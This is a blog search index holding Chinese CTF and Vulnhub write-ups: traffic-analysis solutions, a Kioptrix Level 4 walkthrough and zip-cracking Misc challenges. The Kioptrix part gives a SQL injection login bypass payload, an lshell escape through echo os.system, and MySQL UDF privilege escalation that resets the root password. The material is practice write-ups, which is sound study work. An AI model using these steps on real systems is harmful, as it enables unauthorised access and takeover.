<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF_MISC_流量分析做题记录与总结</title>
      <link href="/2024/03/06/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/06/MISC-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="CTF-MISC-流量分析做题记录"><a href="#CTF-MISC-流量分析做题记录" class="headerlink" title="CTF MISC 流量分析做题记录"></a>CTF MISC 流量分析做题记录</h1><blockquote><p>做题记录，主打一个简单，主要是为了列出做过的流量分析。标上难度，给各位练习流量分析提供一些方向，步骤很简略，要看详细的wp可以自行搜索</p><p>总结在后面</p></blockquote><h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><h4 id="0x01-wireshark"><a href="#0x01-wireshark" class="headerlink" title="0x01 wireshark"></a>0x01 wireshark</h4><ul><li>简单，wireshark搜索password，直接可以找到</li></ul><h4 id="0x02-被嗅探的流量"><a href="#0x02-被嗅探的流量" class="headerlink" title="0x02 被嗅探的流量"></a>0x02 被嗅探的流量</h4><ul><li>简单，wireshark搜索flag{</li></ul><img lazyload src="/images/loading.svg" data-src="MISC-流量分析做题记录/image-20240307170807418.png" alt="image-20240307170807418" style="zoom:50%;"><h4 id="0x03-http流量分析1"><a href="#0x03-http流量分析1" class="headerlink" title="0x03 http流量分析1"></a>0x03 http流量分析1</h4><ul><li>简单，直接搜索flag就可以找到</li></ul><h4 id="0x04-数据包中的线索"><a href="#0x04-数据包中的线索" class="headerlink" title="0x04 数据包中的线索"></a>0x04 数据包中的线索</h4><ul><li>简单，搜索http，追踪一下</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307214852713.png" alt="image-20240307214852713"></p><ul><li>from base64 cyberchef</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307214909940.png" alt="image-20240307214909940"></p><h4 id="0x05-被偷走的文件"><a href="#0x05-被偷走的文件" class="headerlink" title="0x05 被偷走的文件"></a>0x05 被偷走的文件</h4><ul><li>简单，wireshark直接导出flag.rar</li><li>Wireshark:file— Export Objects — FTP-data</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307215844137.png" alt="image-20240307215844137"></p><ul><li>Flag.rar是加密的，ARCHPR跑出密码<code>5790</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307215943179.png" alt="image-20240307215943179"></p><ul><li>flag</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307220232663.png" alt="image-20240307220232663"></p><h4 id="0x06-荷兰数据泄露"><a href="#0x06-荷兰数据泄露" class="headerlink" title="0x06 荷兰数据泄露"></a>0x06 荷兰数据泄露</h4><p><strong>这是一道宽带数据分析题</strong></p><ul><li>题目描述：flag{宽带用户名}</li><li>简单，拿到了需要通过一个工具，把<code>conf.bin</code>转化为conf.xml，在里面可以直接找到<code>username</code></li></ul><blockquote><p>工具： <a class="link" href="https://github.com/jahed/tp-link-config-editor">jahed/tp-link-config-editor: A web interface to edit TP-Link Router Config export files (typically named config.bin). (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h4 id="0x07-NTFS数据流"><a href="#0x07-NTFS数据流" class="headerlink" title="0x07 NTFS数据流"></a>0x07 NTFS数据流</h4><blockquote><p><a class="link" href="https://hasegawaazusa.github.io/ntfs-streams-note.html">ntfs 数据流笔记 | 独奏の小屋 (hasegawaazusa.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>简单，用ntfs数据流读取工具就可以<code>AlternateStreamView</code></li><li>注意解压需要在windows环境下，用winrar或者7zip</li><li>再把解压后的文件夹丢进工具扫描</li></ul><blockquote><p>看到一篇不错的文章：<a class="link" href="https://www.freebuf.com/articles/terminal/195721.html">Windows ADS在渗透测试中的妙用 - FreeBuf网络安全行业门户 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="中等"><a href="#中等" class="headerlink" title="中等"></a>中等</h3><h4 id="0x01-9-3-2-webshell混淆流量分析-webshell流量分析1"><a href="#0x01-9-3-2-webshell混淆流量分析-webshell流量分析1" class="headerlink" title="0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1"></a>0x01 [9.3.2 webshell混淆流量分析]webshell流量分析1</h4><ul><li>webshell</li></ul><h4 id="0x03-流量分析"><a href="#0x03-流量分析" class="headerlink" title="0x03 流量分析"></a>0x03 流量分析</h4><ul><li>题目hint</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">流量分析</span><br><span class="line"></span><br><span class="line">提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c</span><br><span class="line">提示二：注意补齐私钥格式</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">XXXXXXX</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div><ul><li>中等，主要是不能被FTP里面的Fl-g.zip绕进去，我显然是被绕进去了🤮。一直在试图修zip，拿到里面的qr-code.jpg，大家一定要仔细琢磨提示。</li><li>tcp contains “KEY” 可以找到一串base64 的image</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307203003473.png" alt="image-20240307203003473"></p><ul><li>from base64 cyberchef 得到一张图</li></ul><p><img lazyload src="/images/loading.svg" data-src="./download.png" alt="download"></p><ul><li>把这些提取出来（考眼力，做到这我已经疲惫了），按照提示补齐私钥，导入wireshark</li></ul><p>编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;RSA keys list Edit-&gt;添加key file-&gt;完成</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="./image-20240307204942387.png" alt="image-20240307204942387"></p><ul><li>然后就可以看到http</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307204958136.png" alt="image-20240307204958136"></p><ul><li>终于，flag</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240307204857654.png" alt="image-20240307204857654"></p><ul><li>参考</li></ul><blockquote><p>这位师傅做这道题的心路历程和我差不多😭：<a class="link" href="https://fengyuhetao.github.io/posts/22230/#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">ddctf2018 · Tianji’s Blog (fengyuhetao.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h1 id="CTF-MISC-流量分析总结"><a href="#CTF-MISC-流量分析总结" class="headerlink" title="CTF MISC 流量分析总结"></a>CTF MISC 流量分析总结</h1>]]></content>
      
      
      <categories>
          
          <category> CTF做题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC-流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kioptrix Level 1.3(#4)</title>
      <link href="/2024/03/05/Kioptrix-Level-1-3/"/>
      <url>/2024/03/05/Kioptrix-Level-1-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Kioptrix-Level-1-3-4"><a href="#Kioptrix-Level-1-3-4" class="headerlink" title="Kioptrix Level 1.3(#4)"></a>Kioptrix Level 1.3(#4)</h1><h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ul><li>IP为<code>192.168.89.141</code></li><li>nmap扫描端口以及端口服务</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 22:04 EST</span><br><span class="line">Nmap scan report for 192.168.89.141</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 39528 closed tcp ports (conn-refused), 26003 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.68 seconds</span><br></pre></td></tr></table></figure></div><p>开放了ssh、http、samba</p><ul><li>开放了80，那就先dirsearch扫扫看：<code>dirsearch --url http://192.168.89.141 </code>，同时浏览器访问 <code>http://192.168.89.141</code></li></ul><img lazyload src="/images/loading.svg" data-src="Kioptrix-Level-1-3/image-20240305204216081.png" alt="image-20240305204216081" style="zoom:50%;"><ul><li>看到了smb服务且80端口需要用户信息，那么就用enum4linux扫扫</li></ul><blockquote><p>enum4linux的介绍：<a class="link" href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>比较全的扫描方法：<code>enum4linux -a -o &lt;ip&gt;</code>，这里主要看他的用户信息：<code>enum4linux -U 192.168.89.141</code>(<em>主要是因为http里面涉及到用户登录</em>)</p><p><img lazyload src="/images/loading.svg" data-src="./image-20240305203732012.png" alt="image-20240305203732012"></p><p>能看到一些用户信息，主要有loneferret、john、robert、root、nobody</p><ul><li>80端口是个登录界面，先试试能不能简单sql注入，随便在Username里输入<code>admin</code>，在Password里输入<code>&#39;or&#39;1&#39;=&#39;1&#39;</code>，发现还真能注入:laughing:</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305204504698.png" alt="image-20240305204504698"></p><ul><li>回显了一个User信息，但估计这个admin用户不在members里面，简单探索到这里，看看dirsearch什么结果</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305204622062.png" alt="image-20240305204622062"></p><ul><li>dirsearch其实也没什么特别的，/checklogin就是一个页面没什么信息，/database.sql是个sql文件，但是我们能在里面看到有一个<code>john</code>在members表里面密码是<code>1234</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305204912967.png" alt="image-20240305204912967"></p><ul><li>但是拿这个密码登录失败了，看来是修改过，无所谓，我会注入，输入上面一样的注入密码<code>&#39;or&#39;1&#39;=&#39;1</code>，轻松登录，拿到了john的真实密码<code>MyNameIsJohn</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305205101931.png" alt="image-20240305205101931"></p><ul><li>同样的方式，看看能不能拿到root、nobody、loneferret、robert的密码，最后只拿到了robert的密码<code>ADGAdsafdfwt4gadfga==</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305205720214.png" alt="image-20240305205720214"></p><ul><li>ssh 连接用户，但是发现两个用户都在受限的shell里面（以john为例），根据提示<code>Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands</code>，输入一个<code>?</code>发现能执行的命令很有限：<code>cd clear echo exit help ll lpath ls</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305210854321.png" alt="image-20240305210854321"></p><h4 id="信息搜集总结"><a href="#信息搜集总结" class="headerlink" title="信息搜集总结"></a>信息搜集总结</h4><ul><li>发现了登录界面的sql注入，通过简单注入，拿到了john和robert两个用户的密码</li><li>利用拿到的密码，通过ssh，远程登录了主机，但在受限的shell环境里，==下一步需要绕过限制，如果只是普通用户权限，还需要考虑提权==</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="echo绕过受限的shell"><a href="#echo绕过受限的shell" class="headerlink" title="echo绕过受限的shell"></a>echo绕过受限的shell</h4><ul><li>这种受限的shell称为lshell(limited shell)，执行的命令优有限，但是lshell关于<code>echo</code>存在一个漏洞，我们可以通过<code>echo os.system(&quot;/bin/bash&quot;)</code>，绕过限制。</li></ul><blockquote><p>lshell绕过限制：<a class="link" href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><em>文章中还提到了通过vim命令绕过的方法</em></p></blockquote><ul><li>输入命令，成功绕过，可以执行很多命令，但我们还是普通用户权限</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305212141847.png" alt="image-20240305212141847"></p><h4 id="查看网站源代码"><a href="#查看网站源代码" class="headerlink" title="查看网站源代码"></a>查看网站源代码</h4><ul><li>回到80端口的思路，看看网站源码，试试看login的校验，于是查看<code>checklogin.php</code>，发现了mysql用户root，没有密码，好家伙😄</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305212754868.png" alt="image-20240305212754868"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="MySQLUDF提权"><a href="#MySQLUDF提权" class="headerlink" title="MySQLUDF提权"></a>MySQLUDF提权</h4><ul><li>先用root登录mysql：<code>mysql -u root</code>，发现mysql的版本是<code>5.0.51a</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305213255453.png" alt="image-20240305213255453"></p><p>==接下来的思路就是看看能不能利用mysql提权==</p><p><em>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。<strong>由于MySQL这里正好&lt;5.1,我们可以直接尝试UDF提权</strong></em></p><blockquote><p><a class="link" href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://www.cnblogs.com/miansj/p/13996110.html">Mysql提权-基于Mysql的UDF提权（Linux系统） - 码小农的幸福生活 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>在mysql数据库下输入命令<code>create function sys_eval returns string soname &#39;lib_mysqludf_sys.so&#39;;</code>，<strong>sys_eval可以执行系统命令并在屏幕上显示</strong>，<code>select * from mysql.func</code>查看是否创建成功</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240305214900539.png" alt="image-20240305214900539"></p><p><strong>成功创建</strong></p><ul><li>利用sys_eval实现系统命令，我们直接来修改root密码，<code>select sys_eval(&quot;sudo passwd root&quot;)</code>，然后直接设置root的新密码，再登录，成功拿到root</li></ul><p><em>后来发现sys_exec也可以执行系统命令，但是他无法打印在屏幕上，也无法交互，所以可以用来修改一些权限，比如<code>chmod u+x /bin/bash</code>或者用usermod修改用户所在的组，提权</em> </p><blockquote><p><a class="link" href="https://shifty0g.github.io/postsKioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p><img lazyload src="/images/loading.svg" data-src="./image-20240305220016944.png" alt="image-20240305220016944"></p><h2 id="学习总结与参考链接"><a href="#学习总结与参考链接" class="headerlink" title="学习总结与参考链接"></a>学习总结与参考链接</h2><ul><li>enum4linux的使用场景</li></ul><blockquote><p> enum4linux的介绍：<a class="link" href="https://blog.csdn.net/qq_63844103/article/details/127219997">【网安神器篇】——enum4linux枚举工具-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li><p>涉及到80端口，可以先扫起来，然后去搜集信息，拿到shell之后，<strong>要先查看源代码</strong>，看看有没有漏掉的信息</p></li><li><p>受限shell绕过方法：echo</p></li></ul><blockquote><p>lshell绕过限制：<a class="link" href="https://www.aldeid.com/wiki/Lshell">Lshell - 醛 (aldeid.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>mysql中的udf提权，<strong>mysql还有很多种提权方式有待学习</strong></li></ul><blockquote><p><a class="link" href="https://www.sqlsec.com/2020/11/mysql.html#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E6%9D%83%E9%99%90">MySQL 漏洞利用与提权 | 国光 (sqlsec.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><ul><li>参考walkthrough</li></ul><blockquote><p><a class="link" href="https://shifty0g.github.io/posts/kioptrix-level-4/">Kioptrix Level 1.3 (#4) - Vulnhub | @shifty0g <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://juejin.cn/post/7291291581574529078#heading-6">【Vulnhub通关】Kioptrix: Level 1.3 (#4) - 掘金 (juejin.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 类OSCP靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023春秋杯_Misc</title>
      <link href="/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/"/>
      <url>/2024/03/04/2023%E6%98%A5%E7%A7%8B%E6%9D%AF-Misc/</url>
      
        <content type="html"><![CDATA[<h1 id="谁偷了我的外卖"><a href="#谁偷了我的外卖" class="headerlink" title="谁偷了我的外卖"></a>谁偷了我的外卖</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ul><li>小凯最近入职了大厂，但是在工作途中出现了一些麻烦事，怎么办呢</li></ul><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul><li>拿到手是一张jpg</li></ul><img lazyload src="/images/loading.svg" data-src="2023春秋杯-Misc/小凯.jpg" alt="小凯" style="zoom:33%;"><ul><li>binwalk分析一下，发现里面有个压缩包，binwalk -e 不管用，foremost提取一下</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304160239092.png" alt="image-20240304160239092"></p><ul><li>010里还有个提示：<code>I can give you a hint: - = / But there was a takeaway that was partially eaten.</code></li><li>拿到压缩包，是加密的，里面是一个flag文件夹和很多“外卖”文件</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304160712556.png" alt="image-20240304160712556"></p><p><strong>观察发现有序的且“_”后面的4个字符很像base64，再加上前面有序号，以及提示信息，很容易猜测是要把这些按顺序组合成一段base64</strong></p><ul><li>我先随便提取一下，形成一个文件夹，这样虽然文件是空的，但是文件名都在，再利用批量处理文件夹名称，再利用python</li></ul><p><strong>能发现第一个少了四个字母</strong></p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304161318875.png" alt="处理文件夹文件名称"></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding =gbk</span></span><br><span class="line"><span class="keyword">from</span> natsort <span class="keyword">import</span> ns, natsorted</span><br><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">folder = <span class="string">r&quot;/Users/madison/Desktop/wmx&quot;</span></span><br><span class="line">files = os.listdir(folder)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">files_1 = natsorted(files,alg=ns.PATH)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files_1:</span><br><span class="line">    flag+=i</span><br><span class="line">lst = re.findall(<span class="string">&#x27;_([\w|+|=|-]&#123;4&#125;)&#x27;</span>,flag)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">str</span>+=i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>))</span><br></pre></td></tr></table></figure></div><p><strong>先把第2个文件开始的提取出来</strong></p><ul><li>base64解码，可以在末尾发现应该是压缩包</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304161819149.png" alt="image-20240304161819149"></p><ul><li>补上文件头<code>504b03</code>的base64:<code>UEsD</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304162516972.png" alt="image-20240304162516972"></p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304162720172.png" alt="image-20240304162720172"></p><p><strong>成功拿到download.zip</strong></p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304162046748.png" alt="image-20240304162046748"></p><p><strong>这两个文件就是之前加密压缩包flag文件夹里的两个文件，还差一个txt.galf，这个明显就是flag.txt反过来</strong></p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304162147928.png" alt="image-20240304162147928"></p><ul><li>查看这两个文件<ul><li>md文件里有一半的flag<code>flag&#123;W1sh_y0u_AaaAaaaa</code>，钥匙.png是一张用<strong>bandizip</strong>压缩文件的图，使用的算法是<strong>ZipCrypto</strong>，猜测要使用明文爆破bkcrack了</li></ul></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304162805829.png" alt="image-20240304162805829"></p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304163109001.png" alt="image-20240304163109001"></p><ul><li><p>用bandizip压缩提取出来的md或png，记住要<strong>选用zipcrypto算法</strong>，算法需要一致，这里以压缩png为例，压缩成crack.zip</p></li><li><p>用bkcrack明文爆破出密钥</p></li></ul><p>-C 对应待解密的压缩包，-c为待解密压缩包里的某个加密文件，-P为明文压缩包，-p为已知的明文文件或明文信息</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C wmx.zip -c 外卖箱/flag/小凯的奋斗故事.md -P crack.zip -p 小凯的奋斗故事.md</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="./image-20240304164507564.png" alt="image-20240304164507564"></p><p><strong>拿到密钥：48ff002a 56e00484 380c5c49</strong></p><ul><li>利用密钥破解</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C wmx.zip -k 48ff002a 56e00484 380c5c49 -U new.zip 1234 </span><br></pre></td></tr></table></figure></div><p>-k为密钥，-U为你设置的新的zip，和新zip的密码（会把原来的zip里的东西复制到new.zip中，并且new.zip的密码被覆盖为1234）</p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304164738068.png" alt="image-20240304164738068"></p><ul><li>成功提取并打开txt.galf</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304164841781.png" alt="image-20240304164841781"></p><ul><li>结合文件名以及上半部分的flag，可知，文本内容需要倒置过来</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W1sh_y0u_AaaAaaaaaaaaaaa_w0nderfu1_CTF_journe9&#125;</span><br></pre></td></tr></table></figure></div><h1 id="明文混淆（复现）"><a href="#明文混淆（复现）" class="headerlink" title="明文混淆（复现）"></a>明文混淆（复现）</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><ul><li>小明新买了一台windows电脑，给了小文一个经过两层混淆的webshell，，但压缩包密码搞忘了。听说webshell密码是一个叫flag的东西。。。</li></ul><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ul><li>压缩包是加密的，一一排除伪加密，暴力破解，剩下明文爆破</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304203835579.png" alt="image-20240304203835579"></p><ul><li>bkcrack先查看一下压缩包的加密算法：<code>bkcrack -L</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304203726863.png" alt="image-20240304203726863"></p><p><strong>果然是ZipCrypto，明晃晃的明文爆破了</strong></p><ul><li>从LICENSE.txt 入手，所有的LICENSE.txt，都有换行，把明文设置为12个以上的空格</li><li>bkcrack爆破</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304211905788.png" alt="image-20240304211905788"></p><p><img lazyload src="/images/loading.svg" data-src="./image-20240304211926934.png" alt="image-20240304211926934"></p><ul><li>提取出shell2.php，解混淆</li></ul><p><img lazyload src="/images/loading.svg" data-src="./image-20240304212121097.png" alt="image-20240304212121097"></p><p><em>php解混淆知识有待加强:sob:</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF做题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC-压缩包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mad1sun&#39;s_diary</title>
      <link href="/2024/03/04/Mad1sun-s-diary/"/>
      <url>/2024/03/04/Mad1sun-s-diary/</url>
      
